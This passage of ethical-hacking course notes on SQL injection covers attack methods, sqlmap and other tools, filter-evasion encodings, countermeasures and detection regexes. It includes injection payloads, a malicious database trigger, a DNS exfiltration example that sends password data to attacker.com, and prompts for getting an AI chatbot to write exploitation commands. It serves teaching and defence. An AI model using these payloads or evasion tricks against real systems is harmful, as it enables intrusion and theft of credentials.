- **Finding Directory Structure:** `SELECT @datadir;` to find the database's data directory, which helps locate the web server's root.

### Creating Database Backdoor
Attackers use database triggers (stored procedures automatically invoked by events) to create backdoors.
- **Example:** In an online shop, an attacker injects a trigger that sets the price of any newly inserted or updated item to 0.
    ```sql
    CREATE OR REPLACE TRIGGER SET_PRICE AFTER INSERT OR UPDATE ON ITEMS FOR EACH ROW BEGIN UPDATE ITEMS SET Price = 0; END;
    ```

### HTTP Header-Based SQL Injection
Attackers can inject SQL queries through HTTP headers if the application stores these header values in a database without proper sanitization.

- **`X-Forwarded-For`:** Used to identify the originating IP of a client. An attacker can modify this header to `10.10.10.11'or 1=1#` to bypass IP-based authentication.
- **`User-Agent`:** Contains information about the user's browser. An attacker can modify it to inject a string like `aaa'or 1/*`.
- **`Referer`:** Specifies the URI of the document that referred the user. It can be modified for injection if the application stores this data unsanitized.

### DNS Exfiltration using SQL Injection
Attackers use DNS exfiltration when direct communication from the server to the internet is blocked, but internal DNS resolution is allowed.
- **Mechanism:** The attacker embeds the output of a malicious query within a DNS request. For example, `do_dns_lookup((select top 1 password from users) + '.attacker.com');`
- The database performs a DNS lookup for a fabricated hostname like `passwordHash.attacker.com`. The attacker, controlling the name server for `attacker.com`, captures the DNS request and extracts the sensitive data from the subdomain.

### MongoDB Injection/NoSQL Injection Attack
MongoDB, a NoSQL database, is vulnerable to injection attacks that bypass authentication when applications use their PHP, Python, or JavaScript drivers insecurely.
- Attackers use operators like `$eq`, `$ne`, `$gt`, and `$regex` in JSON-based queries.
- **Example:** An application authenticates users with a query like `{ "user" => $user_name, "password" => $pwd }`. An attacker can inject a payload like `User_name[$eq]=admin&pwd[$ne]=admin` into the POST request. This becomes a query that finds a user named "admin" with a password not equal to "admin", effectively logging them in.

### JavaScript Injection in MongoDB Database
If an application uses the vulnerable `$where` query operation, an attacker can inject malicious JavaScript.
- An attacker creates a payload that causes a Denial of Service (DoS) by injecting a `while(true)` loop.
- They can also craft `return` statements to extract all data when an empty string is compared, as `'this.username === '''` can be manipulated.

---

## SQL Injection Tools

### sqlmap
An open-source penetration testing tool that automates the detection and exploitation of SQL injection flaws. It has a powerful detection engine and supports a wide range of databases.
- **Techniques Supported:** Boolean-based blind, time-based blind, error-based, UNION query-based, stacked queries, and out-of-band.
- **Features:**
    - Connects directly to the database without passing via SQL injection if credentials are provided.
    - Enumerates users, password hashes, privileges, roles, databases, tables, and columns.
    - Automatically recognizes password hash formats and supports dictionary-based cracking.
    - Dumps entire database tables, specific columns, or ranges of entries.
    - Searches for specific database names, tables, or columns across all databases.
    - Can establish an out-of-band stateful TCP connection to the OS.

### Mole
An automatic SQL injection exploitation tool that uses a command-line interface with auto-completion. It can detect and exploit vulnerabilities using both UNION and Boolean-based blind techniques.
- **Features:** Supports MySQL, Postgres, SQL Server, and Oracle; exploits GET/POST/Cookie parameters; supports filters to bypass IDS/IPS rules; can exploit injections that return binary data.

### Other Tools:
- **SQL Injection**
- **NoSQLMap**
- **Havij**
- **blind_sql_bitshifting**

### Discovering SQL Injection Vulnerabilities with AI
Attackers can leverage AI/ChatGPT to generate commands for finding and exploiting SQL injection. For example, a prompt like "Check for all possible SQL injection on target url http://testphp.vulnweb.com" might generate the command:
`sqlmap -u "http://testphp.vulnweb.com" --batch --crawl=5 --random-agent --level=5 --risk=3`

### Checking for Boolean-based, Error-based, Time-based, and UNION-based SQL Injection with AI
Attackers can craft specific prompts to generate a series of `sqlmap` commands tailored to a specific injection technique.
- **Boolean Example Prompt:** "Check for Boolean based SQL injection... and enumerate the tables in acuart database"
- **Error-based Example Prompt:** "Perform error based SQL injection on target url... and enumerate the users table"
- **Time-based Example Prompt:** "Check for time-based blind SQL injection... and enumerate the database"
- **UNION-based Example Prompt:** "Check for UNION based SQL injection... and enumerate users table"
The AI generates a single command or a chain of commands using `&&` to automate the entire exploitation process, from detecting the vulnerability to dumping the user credentials.

---

## Objective 04: Demonstrate Different Evasion Techniques

### Evasion Techniques
Firewalls and IDS use signature-based detection to block known attack patterns. Attackers use evasion techniques to obscure their attacks to avoid matching these signatures.

### Evading IDS
An IDS sensor inspects SQL statements to detect attacks. Attackers obscure their input strings to bypass signature-based detection.

- **Signature-based IDS challenge:** It can only detect attacks with known signatures. Attackers change the expression while keeping its function equivalent.

### Types of Signature Evasion Techniques
- **In-line Comment:** Obscures SQL keywords by inserting comments within them. (e.g., `/**/UNION/**/SELECT`)
- **Char Encoding:** Uses the `CHAR()` function to represent characters by their ASCII codes, avoiding quotes. (e.g., `CHAR(97)` for 'a')
- **String Concatenation:** Breaks SQL keywords into pieces and concatenates them. (e.g., `'SEL' + 'ECT'`)
- **Obfuscated Code:** Makes an SQL statement difficult to read using wrapping, complex functions, and concatenation.
- **Manipulating White Spaces:** Adding or dropping spaces, or using special characters like tab (`%09`), carriage return (`%0D`), or line feed (`%0A`).
- **Hex Encoding:** Represents an entire SQL string using hexadecimal encoding. (e.g., `0x73656c656374` for `SELECT`)
- **Sophisticated Matches:** Replaces a known attack signature like `OR 1=1` with an equivalent but different expression (e.g., `OR 'john' = 'john'`).
- **URL Encoding:** Replaces characters with a `%` followed by their ASCII code in hex. Double URL encoding can be used to bypass filters that decode once. (e.g., `'` -> `%27` -> `%2527`)
- **Null Byte:** Uses a `%00` character before a string to terminate it for backend C/C++ functions, while the application layer might not filter it.
- **Case Variation:** Mixes upper and lower case letters in SQL keywords since most SQL is case-insensitive, but simple filters might look for an exact case. (e.g., `UnIoN sElEcT`)
- **Declare Variables:** Passes SQL statements using local variables to hide the malicious string. (e.g., `declare @sqlvar nvarchar(70); set @sqlvar = (N'UNI' + N'ON' + N' SELECT' + N'Password'); EXEC(@sqlvar)`)
- **IP Fragmentation:** Splits the attack payload across multiple, fragmented IP packets that the IDS must reassemble to detect, a resource-intensive process.

### Evasion Technique: Variation
A specific exploration of using `WHERE` statements that are always true. The attacker can use a mathematical comparison (e.g., `SELECT * FROM accounts WHERE userName='Bob' OR 2=2`) or a string comparison (e.g., `SELECT * FROM accounts WHERE userName='Bob' OR 'evade' = 'ev' + 'ade'`) to achieve the same bypass.

---

## Objective 05: Explain SQL Injection Countermeasures

### How to Defend Against SQL Injection Attacks
Developers must adopt secure coding practices to prevent SQL injection.

### Why are Web Applications Vulnerable?
- **Database server runs OS commands:** Compromised servers with high privileges can execute arbitrary OS commands.
- **Privileged accounts:** Applications connect to databases with high-level accounts.
- **Revealing error messages:** Detailed errors leak schema information to the attacker.
- **No data validation:** The most common vulnerability. Input data is not filtered or validated on the server side.
- **Complex software stacks:** Difficulty in maintaining consistent security across multiple layers.
- **Legacy code:** Older codebases may not adhere to modern security standards.
- **Concatenated queries:** A risky practice that makes it easy to alter the intended query structure.

**Key defenses:**
- **Minimizing Privileges:** Create low-privilege database accounts for applications and only add permissions when needed.
- **Implementing Consistent Coding Standards:** Use standardized, secure data access methods and validate input on both the client and server. Use custom, uninformative error messages.
- **Firewalling the SQL Server:** Restrict contact to only trusted clients like the web server. Lock down the server to mitigate risks from insecure scripts, misapplied patches, and administrative errors.

### Countermeasures Against SQL Injection
- Reject entries with binary data, escape sequences, and comment characters.
- Use stored procedures instead of building dynamic SQL directly from user input.
- Implement multiple layers of validation.
- Use the most restrictive SQL account types.
- Use network, host, and application IDS and IPS.
- Perform automated black box injection testing, static code analysis, and manual penetration testing.
- Use parameterized queries and prepared statements.
- Deploy a Web Application Firewall (WAF).
- Disable shell access to the database, unnecessary database functions, and `xp_cmdshell`.

### How to Defend Against SQL Injection Attacks: Use Type-Safe SQL Parameters
Enforcing type and length checks using a Parameter Collection means input is treated as a literal value, not executable code.
- **Vulnerable code:** `new SqlDataAdapter("LoginStoredProcedure" + Login.Text + "'", conn);`
- **Secure code:** `new SqlDataAdapter("SELECT ... FROM Authors WHERE aut_id = @aut_id", conn);` with the parameter added as a literal value.

### Defenses in the Application

1.  **Input Validation:** Prevents user-supplied data from influencing code logic.
    - **Whitelist Validation (Best Practice):** Accepts only approved characters/patterns. Uses characters like `A-Z, 0-9`.
    - **Blacklist Validation (Less Secure):** Rejects known malicious inputs, which is difficult to maintain as it can't anticipate all attack vectors. Uses characters like `%`, `'`, `--`.

2.  **Output Encoding:** Encodes input to ensure it's sanitized before being passed to the database, preventing special characters like single quotes from breaking the SQL syntax. (e.g., replacing `'` with `''`).

3.  **Enforcing Least Privileges:** A best practice where the lowest possible privileges are assigned to every database account. The DBMS should never run as root.

4.  **LIKE Clauses:** Wildcard characters (`%`, `_`, `[`) used in `LIKE` clauses must be escaped and wrapped in square brackets (e.g., `s.Replace("[", "[[]]");`).

5.  **Wrapping Parameters with QUOTENAME() and REPLACE():** In MS SQL, use these functions to handle data used in dynamic Transact-SQL. `QUOTENAME` wraps a string with brackets, effectively escaping it. `REPLACE` can escape quotes.

### SQL Injection Detection Tools
Security professionals use various tools to detect potential SQL injection attacks by looking for classic SQLi patterns and meta-characters.

- **Regular Expressions for Detection:**
    - **SQL meta-characters:** `/(%27)|(\')|(\-\-)|(#)|(%23)/ix`
    - **Modified check for `=` sign:** `/((%3D)|(=))[^\n]*((%27)|(\')|(\-\-)|(%3B)|(;))/ix`
    - **Typical SQLi attack:** `/\w*((%27)|(\'))((%6F)|o|(%4F))((%72)|r|(%52))/ix`
    - **SQLi with UNION keyword:** `/((%27)|(\'))union/ix`
    - **SQLi on MS SQL Server:** `/exec(\s|\+)+(\s|x)p\w+/ix` (detects calls to extended stored procedures like `xp_cmdshell`).

- **Snort:** An IDS/IPS that can be configured with rules to detect and block SQL injection attempts based on content matching and regex in HTTP headers and URI.

- **OWASP ZAP (Zed Attack Proxy):** An integrated penetration testing tool for finding web application vulnerabilities. It includes automated scanners and manual tools, ideal for developers and testers.

- **Damn Small SQLi Scanner (DSSS):** A lightweight, fully functional SQL injection vulnerability scanner that supports GET and POST parameters.

### Module Summary
This module covered basic to advanced SQL injection concepts, a detailed attack methodology (information gathering, detection, launching attacks, advanced exploitation), the use of various tools (sqlmap, Mole), evasion techniques (to bypass firewalls/IDS), and critical defensive countermeasures. The final segment introduced detection tools for identifying these attacks, rounding out the full offensive and defensive perspective.
